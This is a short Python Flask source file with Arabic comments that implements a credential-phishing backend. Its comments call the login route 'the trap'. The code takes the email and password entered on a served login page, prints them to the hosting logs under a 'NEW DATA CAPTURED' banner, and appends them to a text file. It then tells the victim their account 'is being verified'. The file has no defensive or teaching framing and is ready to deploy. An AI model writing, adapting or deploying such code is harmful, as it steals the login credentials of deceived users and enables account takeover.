import os
from flask import Flask, render_template, request

app = Flask(__name__)

# الصفحة الرئيسية (التي تظهر للمستخدم)
@app.route('/')
def home():
    return render_template('index.html')

# المسار الذي يستقبل البيانات (المصيدة)
@app.route('/login', methods=['POST'])
def login():
    # سحب البيانات من النموذج (Form)
    email = request.form.get('email')
    password = request.form.get('password')
    
    # --- هذه الإضافة لتظهر البيانات في Logs بموقع Render ---
    print(f"\n[!!!] NEW DATA CAPTURED [!!!]")
    print(f"USER EMAIL: {email}")
    print(f"USER PASSWORD: {password}")
    print(f"---------------------------------\n")
    # --------------------------------------------------

    # حفظ البيانات في ملف نصي (للاحتياط)
    try:
        with open("captured_data.txt", "a", encoding="utf-8") as f:
            f.write(f"Email: {email} | Password: {password}\n")
    except Exception as e:
        print(f"Error saving to file: {e}")
    
    # رسالة تظهر للمستخدم بعد إرسال بياناته
    return "<h1>Success!</h1><p>Your account is being verified. You can close this page now.</p>"

if __name__ == '__main__':
    # إعداد المنفذ (Port) ليعمل على Render و Localhost
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)